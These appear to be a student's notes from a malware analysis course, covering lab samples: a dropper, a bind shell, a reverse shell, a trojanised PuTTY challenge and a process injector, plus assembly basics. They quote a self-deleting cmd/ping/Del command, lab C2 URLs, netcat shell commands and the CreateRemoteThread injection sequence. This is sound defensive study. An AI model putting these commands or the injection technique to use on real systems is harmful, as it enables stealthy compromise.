<span style="color:#00b050">everything related to file</span> 
=>
#### Filter by everything related to File
![[Pasted image 20240313162729.png]]
if we scroll down:
we can find a file -->  that we found inside our static analysis
=>
`C:\Users\Public\Documents\CR433101.dat.exe`
=>
here we can see that:
- this file is created by malware
![[Pasted image 20240313163021.png]]

=>
to know for sure that the malware is responsible for creating this file:
=>
we can:
- open the Explorer file to this location
- delete the file
- run again the malware
- see if the file is been recreated
- yes It has

=>
<span style="color:#00b050">make a screenshot with also the file explorer and put it inside the Report</span> 

=>
Now 
<span style="background:#d2cbff">we are starting understand what this malware does:</span>
- it tries to reach a website
- it creates a file inside the host
  =>
- **probably** the malware is a -->  <span style="color:#ff9900">malware dropper </span>
	- malware that:
		- <span style="color:#ff9900">downloads</span> a file
		- <span style="color:#ff9900">saves</span> it locally on the host
		- this <span style="color:#ff9900">second payload</span> -->  <span style="color:#ff9900">will do something</span> (that right now we don't know)
		  
- <span style="color:#00b050">BUT WE ARE NOT SURE</span> (we can't prove this already)

>[!warning] Remember
>When the host tries to retrieve any file from internet and INetSim is enabled on REMnux VM
>=>
>the resulting file -->  will be ALWAYS the standard INetSIm executable file
>                   even if we try to:
>                   retrieve a file that doesn't exist
> Ex:
> ![[Pasted image 20240313164314.png]]


#### info on deleting part of the malware
With the static analysis we find also this line:
`cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "%s"`  
=>
we think that:
<span style="background:#fff88f">if the URL that the malware tries to reach doesn't reply</span> =>  delete from the host the malware
=>
let's try to verify this:
=>
we can -->  run the malware without running INetSim
            =>
            the site will not be reachable 
=>
- turn off INetSim from REMnux
- open procmon on FlareVM
- <span style="color:#00b050">filter by the command that we found:</span>
  `cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q`
#### Filter by command 
  ![[Pasted image 20240313165827.png]]

- also filter by the process name (as in the previous example)
=>
- detonate the malware

![[Pasted image 20240313171148.png]]
if we double click on the process -->  we can see the event
=>
now:
<span style="color:#ff9900">we are sure that the malware delete itself if the URL is not reachable</span> 

=>
<span style="background:#fff88f">we can start writing the flow of the malware inside our report:</span>
Program Execution Flow:
- if URL exists:
	- download favicon.ico
	- write it to disk (as CR433101.dat.exe)
	- execute favicon.ico (CR433101.dat.exe)
	  
- if URL doesn't exist:
	- delete from disk
	- do not run
=>
we can also change the name to the report as -->  Dropper.DownloadToURL.exe
## Dynamic Analysis of Unknown Binaries
malware used:
`PMAT-labs/labs/1-2.BasicDynamicAnalysis/RAT.Unknown.exe.malz/RAT.Unknown.exe.malz.7z`

README file:
![[Pasted image 20240313175722.png]]

- extract the file into desktop
- we also already have -->  a file with the hashes of the program
### Start with static analysis
#### Floss
`FLOSS.exe RAT.Unknown.exe.malz > floss.txt` 
  Interesting strings:
  ```
@SSL support is not available. Cannot connect over SSL. Compile with -d:ssl to enable.
@https
@No uri scheme supplied.
InternetOpenW
InternetOpenUrlW
@wininet
@wininet
MultiByteToWideChar
@kernel32
@kernel32
MessageBoxW
@user32
@user32
@[+] what command can I run for you
@[+] online
@NO SOUP FOR YOU
@\mscordll.exe
@Nim httpclient/1.0.6
@/msdcorelib.exe
@AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@intrt explr
@http://serv1.ec2-102-95-13-2-ubuntu.local
```

add this to the note [[1.2-RAT.CMDSocket.exe]]

### First Detonation
#### NO INetSim
- turn OFF INetSim
- detonate the malware

we only got this message box:
![[Pasted image 20240313181344.png]]
=>
save it inside the notes

### Wireshark
- turn on wireshark
- detonate the malware

Open the first packet with the highest protocol =>  HTTP packet in this case
![[Pasted image 20240313182042.png]]
=>
- we found a http request to -->  `http://serv1.ec2-102-95-13-2-ubuntu.local/`
- the user agent is weird -->  `intrt explr`

<span style="background:#fff88f">there is ore more interesting packet:</span>
a HTTP request ti -->  `msdcorelib.exe`
![[Pasted image 20240313182256.png]]

=>
update your notes

#### Second packet 
let's find more info about the second packet that we found
=>
right click on it > <span style="color:#ff9900">Follow</span> > HTTP Stream
=>
we can simply see that the HTTP request:
- download a file called -->  `msdcorelib.exe`

>[!warning]
>this doesn't mean that on our machine:
><span style="color:#00b050">we'll have a file</span> -->  <span style="color:#00b050">called in this way</span>
>
>It's possible that:
>- the downloading of a resource
>- the writing on the disk
>
>can be 2 very separate transactions 
>=>
>the data downloaded can for example -->  <span style="color:#00b050">written with a different name</span> to the host
>this is called:
><span style="color:#00b050">DECHAINING</span> or <span style="color:#00b050">DECOUPLING</span> => you download a resource and write to disk with diff name

Add to the report:
Potential file download -->  `msdcorelib.exe`

### Host-Based Indicators
Turn back the VM pre detonation

Right now we know:
- the malware must connect through Internet (INetSim) to work
- the malware makes to http request:
	- one is a potential download file
=>
<span style="color:#ff9900">we have found a Network indicator</span> =>   let's find a host indicator that can confirmed it
=>
<span style="background:#fff88f">look at the strings we found:</span>
`@/msdcorelib.exe`
`@AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

One hypothesis can be -->  the file <span style="color:#ff9900">msdcorelib.exe is saved into this path</span>

>[!tips]
>It's common to install malware in -->  <span style="color:#ff9900">Startup menu </span> (as in our path)
>=>
>the malware will be <span style="color:#ff9900">executed DURING USER LOGINS</span>

=>
#### Procmon
To test this hypoth =>  we can use procmon
- filter by [[Notes_PMAT#Filter by process name|process name]]
- INetSim must run
- detonate the malware
- filter by [[Notes_PMAT#Filter by everything related to File|everything related to File]]

##### Filter by Path
=>
let's filter by our path (that we found in the strings)
`AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
![[Pasted image 20240314103729.png]]
ALSO:
- filter OFF the -->  filter by file
=>
![[Pasted image 20240314104255.png]]

What we found:
- the path that we found is:
   `AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
=>
- <span style="color:#ff9900">the malware can DYNAMICALLY</span> -->  Concat `C:\Users\simone`
- <span style="color:#ff9900">the malware creates a file in this path</span> -->  called `mscordll.exe`
- but the GET request is not for this file but for -->  `msdcorelib.exe`
=>
save this inside the [[1.2-RAT.CMDSocket.exe|report]] as -->  host indicator

ALSO:
<span style="color:#ff9900">we must check if </span>-->  this file is really in this path
=>
- open the file explorer
- paste the path
   `C:\Users\simone\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
   ![[Pasted image 20240314105037.png]]
=>
- <span style="color:#ff9900">we verify that the file exists</span>
- if we open it -->  we verify that is the <span style="color:#ff9900">default INetSim executable</span>
  =>
  the <span style="color:#ff9900">file is been downloaded with the malware</span> 
- and it will execute -->  after user logins
=>
add this to the report

#### TCPView
- Restore VM before detonation
Now:
we are going to check for host indicators about -->  the TCP connection that the malware made
=>
- Open TCPView (search it with win button)
- Detonate the malware
![[Pasted image 20240314110620.png]]
What we found:
- RAT.Unknown.exe is in a `Listen state`:
	- on `ALL addresses`
	- on `local port 5555`
  =>
  save it inside the report -->  TCP Socket in Listening State (and paste the screenshot)

=>
now that we know that the malware opens a socket:
=>
let's try to connect to that socket with -->  netcat

##### Netcat
`nc -nv 10.0.0.3 5555` 
`-nv` -->  no DNS resolution
`10.0.0.3` -->  IP FlareVM
`5555` -->  port we found in TCPView
![[Pasted image 20240314112451.png]]
- <span style="color:#ff9900">we obtain something in base64 </span> 
=>
let's decode this:
`echo "WytdIHdoYXQgY29tbWFuZCBjYW4gSSBydW4gZm9yIHlvdQ==" | base64 -d`
![[Pasted image 20240314112652.png]]

copy inside note -->  Base64 encoded data from socket on TCP 5555

#### Verify if there is command injection
Let's check with out connection in netcat if there is command injection:
=>
- type inside the nc connection -->  `ipconfig`   (a WINDOWS COMMAND)
- decode the output
=>
![[Pasted image 20240314113319.png]]
=>
<span style="color:#00b050">WE CONFIRMED THAT THE MALWARE CAN INJECT COMMAND</span>   (as README file said)

Try with different command to check better
=>
<span style="background:#fff88f">update note</span>
=>
change also the filename:
`RAT.CMDSocket.exe`

##### Other check with Procmon
- Open Procmon
- filter by [[Notes_PMAT#Filter by process name|process name]]
###### Filter by TCP
![[Pasted image 20240314114146.png]]

NOW:
<span style="color:#ff9900">send a command through netcat</span> -->  `id`
=>
![[Pasted image 20240314114704.png]]
<span style="color:#00b050">We have a successful</span> -->  TCP Receive and TCP Send

Now to see the complete TCP flow:
- open task manager > kill the malware
  =>
  you will see the TCP connection close
- run again the malware
  =>
  you will see the entire TCP socket creation
  ![[Pasted image 20240314115021.png]]

<span style="background:#fff88f">TO SEE the entire WORKFLOW of the malware with a command injection:</span>
- remove the filter by TCP
- write in netcat -->  whoami
=>
![[Pasted image 20240314115409.png]]
<span style="color:#00b050">we can see the malware that run the tool whoami on the host</span> 

=>
### Malware Classification
this is a -->  <span style="color:#00b050">BIND SHELL</span>

## Analyzing a Reverse Shell 
- restore VM to pre detonation

malware:
`PMAT-labs/labs/1-2.BasicDynamicAnalysis/RAT.Unknown2.exe.malz/RAT.Unknown2.exe.7z`

README:
![[Pasted image 20240314115853.png]]

### Static analysis
- we have the hashes inside the malware folder
- paste them in [[cheat#VIRUSTOTAL]] -->  no result
- open cmder
- run [[Notes_PMAT#FLOSS]] -->  `FLOSS.exe RAT.Unknown2.exe.malz > floss_output.txt`
- floss -->  no relevant strings
#### PEStudio
- open the malware
- look at:
	- indicators
	- strings
=>
no relevant info
=>
let's move into Dynamic analysis

### Dynamic analysis
- turn on INetSim 
- turn on Wireshark
- detonate the malware as admin

#### Wireshark
check the first highest protocol packet:
DNS
![[Pasted image 20240314122525.png]]
=>
<span style="color:#ff9900">we found a</span> -->  an A record DNS for `aaaaaaaaaaaaaaaaaaaa.kadusus.local`
update our note -->  [[1.2-RAT.Unknown2.exe]]

>[!warning]
>Maybe in the static analysis:
>we found one of these strings -->  aaaaa..., kadusus or local
>
>the reason why we didn't find the entire string:
>is that some malware -->  <span style="color:#ff9900">build the strings at runtime</span> 
>=>
>in this case -->  you will never find the strings with static analysis

Notice:
that we only found DNS request => NO HTTP

#### Fake DNS reply
We know that the malware tries to -->  connect to `aaaaaaaaaaaaaaaaaaaa.kadusus.local` via DNS
=>
we can:
- <span style="color:#ff9900">modify</span> the `/etc/host` file on FlareVM
- so that we can say -->  <span style="color:#ff9900">This record is here inside FlareVM</span>
=>
- open cmder as admin
- `nano.exe C:\Windows\System32\drivers\etc\hosts`
- paste -->  `127.0.0.1               aaaaaaaaaaaaaaaaaaaa.kadusus.local`
- `CTRL+O` > enter > `CTRL+X`
- `ipconfig /flushdns` -->  to clear DNS cache

=>
when we run the malware:
- the <span style="color:#00b050">DNS request will be redirect to our host</span>
  =>
How to test it:
with -->  procmon

##### Procmon
- filter by [[Notes_PMAT#Filter by process name|process name]]
- filter by [[Notes_PMAT#Filter by TCP|TCP]]
- detonate the malware
![[Pasted image 20240314124416.png]]
=>
<span style="color:#ff9900">it tries to reach </span>-->  the <span style="color:#ff9900">domain via HTTPS</span> 
=>
save it in the report -->  Potential call out to specified DNS record on HTTPS port (443)

##### Listen for DNS with netcat
- keep open procmon
- on cmder -->  `ncat.exe -nvlp 443`
![[Pasted image 20240314125012.png]]
=>
- <span style="color:#ff9900">we have opened socket with our fake locally server</span>
  =>
- let's try if there is -->  <span style="color:#ff9900">command injection</span> possibility
  =>
  _<span style="color:#00b050">YES WE HAVE</span>_
  ![[Pasted image 20240314125304.png]]
=>
Update the report -->  Reverse shell capabilities
#### Malware Classification
This is a:
<span style="color:#00b050">REVERSE SHELL</span> -->  bc:
                   - we setup a listener
                   - after the malware is been executed => the malware connected to the listener
=>

### Parent-Child Process Analysis (always dynamic analysis)
- Clear the procmon output (1)
- Remove the TCP filter (2-5)
  ![[Pasted image 20240314130532.png]]
- write another command inside netcat -->  id

<span style="background:#fff88f">To analyze the Parent-Child Process:</span>
- click on Process Tree (1)
- click on the malware (2)
  ![[Pasted image 20240314131231.png]]

<span style="background:#fff88f">Everytime we write a command inside the reverse shell:</span>
- the malware process -->  will <span style="color:#ff9900">spawn a child CMD process</span>
	- this child CMD process -->  will <span style="color:#ff9900">execute the command</span> inside the reverse shell
- Example:
	- if we type -->  `ipconfig` and after `whoami`
	- close and open again the Process tree
	  =>
	  ![[Pasted image 20240314131726.png]]
	- you will find:
		- a child CMD process
		- that runs the command written in the reverse shell
=>
>[!warning]
>Every time:
>you find a process that:
>- spawn child CMD process
>- those CMD processes EXECUTE commands (like whoami, ipconfig, id)
>=>
><span style="color:#ff9900">this is suspicious</span> 

<span style="background:#fff88f">WHAT MALWARE DEVELOPERS DO:</span>
they try to -->  <span style="color:#00b050">DECHAIN / DECOUPLING this parent child relationship</span> (we'll see later)

#### Filter By Parent PID
<span style="background:#fff88f">These info that we found with Parent PID Analysis:</span>
cannot be found -->  by filtering only for the process name
=>

 we can also -->     filter by the parent PID 
                that is 7608  (look at the latest img)
in this way:
we can see -->  <span style="color:#00b050">all the process related to our parent PID</span>
=>
![[Pasted image 20240314133202.png]]

in this way for example we can see:
- the commands that we wrote in the reverse shell -->  as process on host


# SillyPutty Challenge
## Info
Hello Analyst,

The help desk has received a few calls from different IT admins regarding the attached program. They say that they've been using this program with no problems until recently. Now, it's crashing randomly and popping up blue windows when it's run. I don't like the sound of that. Do your thing!

IR Team

### Objective
Perform basic static and basic dynamic analysis on this malware sample and extract facts about the malware's behavior. Answer the challenge questions below. 
If you get stuck, the `answers/` directory has the answers to the challenge.

### Tools
Basic Static:
- File hashes
- VirusTotal
- FLOSS
- PEStudio
- PEView

Basic Dynamic Analysis
- Wireshark
- Inetsim
- Netcat
- TCPView
- Procmon
### Challenge Questions
#### Basic Static Analysis
- What is the SHA256 hash of the sample?
- What architecture is this binary?
- Are there any results from submitting the SHA256 hash to VirusTotal?
- Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?
- Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?
- Is it likely that this binary is packed?

#### Basic Dynamic Analysis
- Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?
- From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?
- What is the DNS record that is queried at detonation?
- What is the callback port number at detonation?
- What is the callback protocol at detonation?
- How can you use host-based telemetry to identify the DNS record, port, and protocol?
- Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?

## Basic static analysis
### What is the SHA256 hash of the sample
`sha256sum.exe putty.exe`
0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 *putty.exe
![[Pasted image 20240314151156.png]]

### What architecture is this binary
`file putty.exe`
putty.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 10 section
=>
32 bit
![[Pasted image 20240314151210.png]]

### VIRUSTOTAL
it seems a -->  trojan / shell code
![[Pasted image 20240314151324.png]]

### Strings
 `FLOSS.exe putty.exe > floss_output.txt`

`FLOSS.exe putty.exe | grep -i "powershell"`
![[Pasted image 20240314155050.png]]
### Binary IMPORT Address Table (IAT)
![[Pasted image 20240314153300.png]]

### Is it likely that this binary is packed
It doesn't seem packed bc:
- the Address table is not short
- in the IMAGE_SECTION_HEADER .text -->  the Virtual Size is almost = to the Raw Data

### Capa output
very long and a lot of info
it seems that the malware:
- Can copy/modify data from the clipboard 
- Has keylogger capabilities
- edit/create registry key
- encrypt and decrypt data
- enumerate file on the host
- OBFUSCATE FILE

All these capabilities -->  are usually performed by putty
the last one no

## Basic Dynamic Analysis
### Describe initial detonation
#### No INetSim
when open the malware =>  you can see a blue screen

#### With INetSim
when open the malware =>  you can see a blue screen

Blue Screen:
could be -->  <span style="color:#00b050">powershell</span> 
### Host indicators - main payload that is initiated at detonation
We can find it with procmon
if we filter by [[Notes_PMAT#Filter By Parent PID|parent PID]]
first process that we find:
![[Pasted image 20240314162934.png]]
![[Pasted image 20240314163232.png]]
=>
It seems that is trying to:
- create a compressed object
- insert into it -->  a string in Base64
=>
let's decrypt it:
`echo "..." | base64 -d > out`
![[Pasted image 20240314163508.png]]
=>
we redirect the output to a file with no extension
with `file` command we know that -->  is a gzip file
=>
open it:
![[Pasted image 20240314163651.png]]
=>
<span style="color:#00b050">we found a SHELL SCRIPT</span>

### Network Indicators - What is the DNS record that is queried at detonation
- Restore VM
- open wireshark and turn on INetSim
=>
first higher protocol packet -->  DNS
![[Pasted image 20240314164532.png]]
=>
it asks for -->  `bonus2.corporatebonusapplication.local` type A, class IN
=>
we can create a fake [[Notes_PMAT#Fake DNS reply|DNS reply]]
- open cmder as admin
- `nano.exe C:\Windows\System32\drivers\etc\hosts`
- paste -->  `127.0.0.1               bonus2.corporatebonusapplication.local
- `CTRL+O` > enter > `CTRL+X`
- `ipconfig /flushdns` -->  to clear DNS cache 

=>
when we run the malware:
- the <span style="color:#00b050">DNS request will be redirect to our host</span>

### What is the callback port number at detonation?
=>
#### TCPView
![[Pasted image 20240314160723.png]]
=>
remote port is -->  8443

### What is the callback protocol at detonation?
The protocol is SSL/TLS. 
This can be identified in Wireshark by the initiation of a CLIENT HELLO message from the detonation to the specified domain


### How to identify the DNS record, port, and protocol?
This can be accomplished by:
filtering on the name of the binary and adding an additional filter of "Operation contains TCP" in procmon

### Can you spawn a shell?
NO
after having setup the /etc/host file:
- setup netcat --> `ncat.exe -nvlp 8443`
- detonate the malware
![[Pasted image 20240314170735.png]]
Why we can't establish the connection:
- look at the wireshark output
- when we try to connect -->  the server tries to establish a HTTPS connection
- =>
  without a valid certificate we won't be able to connect to it 

# Advanced Analysis
This is only an intro to advance anaylisis
## Advanced Static Analysis
<span style="background:#fff88f">we are going to:</span>
- read the <span style="color:#00b050">assembly</span>
- load the malware into -->  - <span style="color:#00b050">decompilers</span>
                         - <span style="color:#00b050">disassemblers</span>
GOAL:
It's to -->  <span style="color:#00b050">REVERSE ENGINEERING</span> the executable files
         (to read the source code)
## Advanced Dynamic Analysis
we are going to run the malware -->  inside <span style="color:#00b050">Debugger</span>
Debugger:
it allows us -->  <span style="color:#00b050">complete control</span> over the <span style="color:#00b050">execution instructions</span>

# Advanced Static Analysis
## Intro Assembly
<span style="background:#fff88f">Assembly core:</span>
- <span style="color:#00b050">instructions</span> -->  simple operations
                `mov %rax, %rbx` -->   copies value from %rbx into %rax
                
                
- <span style="color:#00b050">directives</span> -->  commands for the assembler e not for CPU
	- `.data` -->  section with global and static variables 
	- `.text` -->  section with code (assembler instructions)
		- usually <span style="color:#ff9900">READ ONLY</span>
		- if you try to write it =>  <span style="color:#ff9900">Segmentation fault</span>
		  
	- `.byte .word .long .quad` -->  outputs integer (8/16/32/64 bits) 
	    - suffix -->  `b`, `w`, `l`, `q`
	      
	- `.ascii` `.asciz` -->  outputs string (without/with terminator) 

- <span style="color:#00b050">labels</span> --> create symbol at current address
           `foo: .byte 42`  -->              like global var => `char foo = 42`;

### Instructions
x86 architecture is in -->  <span style="color:#00b050">little endian</span>
=>
data is written:
- from right
- to left
=>
`mov edx, eax` -->  mov eax value to edx value     (=> read from right to left)

#### Operand types
- <span style="color:#00b050">Register</span> 
	- small memory slot stored inside the CPU 
	- the access to these reg is really fast 
	- the n° of these reg and them dimension -->  are limited

- <span style="color:#00b050">Memory</span> 
	- used to store > data than the use of registers 
	- it's like define a pointer in C:
		- we need to specify an address memory --> where we can access/write data 
		  
- <span style="color:#00b050">Constants</span> (aka immediates) 
	- starts with $
	- Examples -->   `$42` or `$0x401000` 
		- $42 --> is a constants
		- $0x401000 -->  
##### Registers
Registers most used -->  <span style="color:#00b050">general purpose</span>
                      `%rax, %rbx, %rcx, %rdx, %rsi, %rdi`

| **32 b**                               | 64b                                    | Description                                                                                      |
| -------------------------------------- | -------------------------------------- | ------------------------------------------------------------------------------------------------ |
| <span style="color:#00b050">EIP</span> | <span style="color:#00b050">RIP</span> | Instruction Pointer:<br>points to the instruction that the CPU is executing now                  |
| <span style="color:#00b050">ESP</span> | <span style="color:#00b050">RSP</span> | Stack Pointer:<br>points to the top of the stack                                                 |
| <span style="color:#00b050">EBP</span> | <span style="color:#00b050">RBP</span> | Base Pointer / Frame Pointer:<br>points to the base of the stack   (beginning of the stack, low) |
###### Small register
`%rax` -->  it's a 64 bit register

<span style="background:#fff88f">we can use smaller registers:</span>
example -->  if you set a 32 bit sub-register =>  t<span style="color:#00b050">he tops 32 bit will be set to 0</span>
=>
1) `%eax` --> sub register that contains last 32 bits 
2) `%ax` --> last 16 bits 
3) `%ah` --> penultimate 8 bits 
4) `%al` --> last 8 bits
![[Pasted image 20240315112745.png]]

##### Memory Operands
To access memory you need to -->  <span style="color:#00b050">dereferencing pointers</span>
<span style="background:#fff88f">dereferencing pointers:</span>
access the variable value to which the pointer points

how -->  `displacement(base, index, scale)`
`displacement` -->  constant value that is added to the resulting address            OPTIONAL
`base` -->  register that contains an address
`index` -->  register used to indexing an array or struct                                          OPTIONAL
`scale` -->  multiplication factor to the index                                                           OPTIONAL
           can be (1, 2, 4, 8)  =>  it's used to defined different array types 

<span style="background:#fff88f">example:</span>
- `(%rax)`
	- there is only `base` => - we use the content of `%rax` as pointers 
                         - and we deference it 
                         =>
    -  we obtain the value inside `%rax`                    (in C is like a pointer)
      
- `0x400000` --> dereferencing a memory address
- `-8(%rbp)` -->  takes the base pointer, subtract 8 B and deference it
- `foo` -->  global variable   (like in C)
- `foo(%rax)` -->   create an array foo
- `foo(, %rax, 8)` 
	- no `base` but we define `index` and `scale` 
	  => 
	- create an array foo with a different type  (multiplication factor = 8 =>   type is long)
![[Pasted image 20240315115137.png]]

##### Jump
| Command                                | Meaning                                       | What does            |
| -------------------------------------- | --------------------------------------------- | -------------------- |
| <span style="color:#00b050">e/z</span> | <span style="color:#00b050">equal/zero</span> | result == 0          |
| <span style="color:#00b050">b</span>   | <span style="color:#00b050">below</span>      | dst < src (UNSIGNED) |
| <span style="color:#00b050">a</span>   | <span style="color:#00b050">above</span>      | dst > src (UNSIGNED) |
| <span style="color:#00b050">l</span>   | <span style="color:#00b050">less</span>       | dst < src (SIGNED)   |
| <span style="color:#00b050">g</span>   | <span style="color:#00b050">greater</span>    | dst > src (SIGNED)   |
| <span style="color:#00b050">s</span>   | <span style="color:#00b050">sign</span>       | result < 0 (SIGNED)  |
| <span style="color:#00b050">n</span>.. | <span style="color:#00b050">not</span>        | negation of ..       |
`cmp` commands -->   `cmp dst, src`

jump to label if `%rax < %rbx` (unsigned) 
`cmp %rbx, %rax` 
`jb label` 

jump to label if `%rax >= %rbx (signed)`              >= bc there is `n` that -->  negate the condition 
`cmp %rbx, %rax` 
`jnl label` 

jump to label if `%rax == 0` 
`test %rax, %rax` 
`jz label` 

jump to label if `%rax >= 0` (signed) 
`cmp $0, %rax` 
`jns label`

### Stack
Remember:
![[Pasted image 20240315120647.png]]
=>
- Top of the stack -->  identifies by `RSP`  (stack pointer)
- Entries inside stack -->  ALWAYS 64 bit
- `push` and `pop` -->  store and load  RSP
- <span style="background:#fff88f">Stack grows downwards</span>
	- `push` decrements %rsp by 8 
	- `pop` increments %rsp by 8

- `call` and `ret` -->  push and pop return address

#### Stack Frames
As the stack grows:
it is logically divided into regions → called <span style="color:#00b050">Stack Frames</span> 
								- allocate the required memory in the stack 
								- for the corresponding function
=>
<span style="background:#fff88f">A stack frame defines: </span>
a frame of data with:
- the beginning `RBP`   (Base pointer)
- the end `RSP`             (stack pointer)
  that is pushed onto the stack when a function is called

##### Prologue
<span style="background:#fff88f">Since the stack memory is built on a Last-In-First-Out (LIFO) data structure:</span>
first step is to -->    store the previous RBP position on the stack
                 (which can be restored after the function completes)
=>
it's used to -->  <span style="color:#00b050">setup the stack frame for the current fz</span>
=>
- The `RBP` in the stack frame -->  is set first when a function is called
- `RBP` contains -->  the `RBP` of the previous stack frame.
- the value of the `RSP` -->  is copied to the `RBP`
                        creating a new stack frame
=>

```asm6502
push RBP
mov RBP, RSP
sub RSP, $n
```
`$n` -->  is the size of local variables 
        =>
        <span style="color:#00b050">we are allocating space</span> for the stack frame
##### Epilogue
used to -->  <span style="color:#00b050">clean the stack frame</span> to make it <span style="color:#00b050">return to the state before the function ca</span><span style="color:#00b050">ll</span>
=>
- `RSP` -->  is replaced by the current `RBP`
-  its value is reset -->  to the value it had before in the prologue
=>
```asm6502
mov RSP, RBP  
pop RBP  
ret ...
```


## Hello, World! Under a Microscope
LAB:
`PMAT-labs\labs\2-1.AdvancedStaticAnalysis\helloWorld-c`
![[Pasted image 20240315123235.png]]

To reverse engineering this we will use -->  [[cheat#Cutter]]
=>
### Cutter
- open it
- import the file .exe
- leave as default
- the main page -->  gives us basic info about the program  (hashes, architecture, size...)
- on the left -->  you can see the functions inside the program
  ![[Pasted image 20240315143333.png]]
Usually:
a program is -->     <span style="color:#00b050">stripped</span>
                =>
                when you reverse it =>  you don't see the function names but random Ch
Why:
bc in this way is -->  harder to analyze it

<span style="background:#fff88f">In the tool bar at the bottom we can:</span>
- see the imports -->  that the program makes
- see the strings and ALSO <span style="color:#00b050">SEARCH strings</span>
  for example we can search for -->  Hello
  ![[Pasted image 20240315143831.png]]
	- If you select it and press `X` -->  you can see where this string is located
	  ![[Pasted image 20240315143951.png]]
	  It's inside main
	  
	- right click on the string > Show in > Disassembly

#### Hello World - Prologue
Open the main function
![[Pasted image 20240315145338.png]]
=>
<span style="background:#fff88f">prologue:</span>
`push   EBP` -->  push the base pointer  (points to the base of the stack)
                =>
                we are preserving the calling fz's base address
`mov    EBP, ESP` -->  move the stack pointer value into the base pointer
`and    ESP, 0xfffffff0` -->  make sure that our stack pointer is pointing to an address
                          that is a -->  multiple of 4
`sub    ESP, 0x10` -->  if you right click on 0x10 you can convert it into decimal (Set based of...)
                     =>
                     we subtract from the stack pointer 16 bit
                     =>
                     <span style="color:#00b050">we are allocating 16 bit space for our string</span> Hello, Wolrd!
#### Hello World - Program flow
After the prologue:
`mov     dword [ESP], str.Hello__World` -->  copy the String into the location of stack pointer
`call    _printf`    -->  call the printf function and prints the string
`mov     EAX, 0` -->  move 0 into EAX

#### Hello World - Epilogue
`leave`  -->  it's an alias for:
            `mov    ESP, EBP` -->     - restore the stack pointer
                                 - put it back to what the stack pointer was before the calling to these function
            `pop    EBP` -->  restore the base pointer
            
`ret` -->  we return the EAX value (=>  in this case 0)

#### Decompiler
in the bottom bar you can click on "Decompiler" -->  to see the code in something similar to the 
                                            original one
![[Pasted image 20240315151358.png]]
##  Advanced Analysis of a Process Injector
LAB:
`PMAT-labs/labs/2-1.AdvancedStaticAnalysis/Malware.stage0.exe.malz/Malware.stage0.exe.malz.7z`

README:

### Basic Analysis
#### Static
`sha256sum.exe Malware.stage0.exe.malz`                                                                                   
fca62097b364b2f0338c5e4c5bac86134cedffa4f8ddf27ee9901734128952e3

##### VIRUSTOTAL 
it seems a trojan and a shellcode
![[Pasted image 20240315152232.png]]

##### Strings
```
@C:\Users\Public\werflt.exe 
@C:\Windows\SysWOW64\WerFault.exe
@C:\Users\Public\werflt.exe

C:\Users\Administrator\source\repos\CRTInjectorConsole\Release\CRTInjectorConsole.pdb
```

##### PeView
no packed malware -->  Virtual Size is similar to the Raw Data
##### PeStudio

##### Capa
mitre -->  Adversaries may execute malicious payloads via loading shared modules

#### Dynamic
##### Procmon
The malware create a file
![[Pasted image 20240315163510.png]]
##### TCPView
Malware tries to connect to the host

![[Pasted image 20240315170904.png]]
=>
we can try with nc to connect to it:
`ncat.exe -nvlp 8443`
![[Pasted image 20240315171506.png]]

<span style="color:#00b050">We found the shell</span>

### Advanced Static Analysis
Open cutter > open this `werflt.exe file` > open the main function

Always open the main function in first

we'll find a -->  classic pattern for a <span style="color:#00b050">create remote thread process injection</span>
<span style="background:#fff88f">process injection:</span>
- malware opens a new process on the host
- and it will inject code into this new process


we can find an API call
  ![[Pasted image 20240315163947.png]]
  this API takes 3 parameter
  =>
  - usually the lines with `push` before the call are the parameters
	  - remember that is in <span style="color:#00b050">little endian</span> =>  the order is reverse  (the first push is the last parameter)
	![[Pasted image 20240315164209.png]]
	=>
	1) DesiredAccess
	2) bInheritHandle
	3) ProcessId -->  it's taken from `EAX` and it's the<span style="color:#00b050"> handle to the current process </span>
	   
`EAX` -->  takes its value from the `argc`
         that is the argument that the program takes from main
  =>
  the malware:
  - takes as argument the ProcessId =>  the <span style="color:#00b050">handle to the process</span>
  - copy the ProcessId into `EAX`
  - opens new process using `EAX`
  - then copy the value of `EAX (processId)` into `EDI`
  - it will use `EDI` to a new API call to -->  <span style="color:#00b050">VirtualAllocEx</span>
    ![[Pasted image 20240315164904.png]]
    =>
    this API call -->  <span style="color:#00b050">will allocate memory inside the new process</span> 

- then we have a new API call to -->  <span style="color:#00b050">WriteProcessMemory</span> 
- it takes as parameters -->   `EDI (processId)`,
                         `ESI (Base addr of this process)`, 
                         `EAX(lpBuffer)`
	- `lpBuffer` -->  is a variable created in the first line of the main
	  ![[Pasted image 20240315165428.png]]


- next API call -->  <span style="color:#00b050">CreateRemoteThread</span>
	- it uses a lot of parameters but only 2 are set:
	  ![[Pasted image 20240315165931.png]]
		- 1° parameter -->  handle to the process (`EDI`)
		- 4° parameter -->  the start address (`ESI`)
		                  =>
		                  _<span style="color:#00b050">where this thread start its execution</span>_
=>
<span style="background:#fff88f">the malware:</span>
- <span style="color:#00b050">opens new process</span> using the -->  handle to the process as argument
- <span style="color:#00b050">allocates</span> <span style="color:#00b050">memory</span> into the new process -->  with R-W-X permissions
- <span style="color:#00b050">writes the conten</span><span style="color:#00b050">t</span> of a specified <span style="color:#00b050">variable</span> -->  into the allocated memory
- starts a thread in the remote process -->  and tells the thread to:
                                        - go to that address (`ESI`)
                                        - execute what ever is there

## Advanced Dynamic Analysis: Debugging Malware
we are going to run the malware -->  inside <span style="color:#00b050">Debugger</span>
Debugger:
it allows us -->  <span style="color:#00b050">complete control</span> over the <span style="color:#00b050">execution instructions</span>

<span style="background:#fff88f">we'll use:</span>
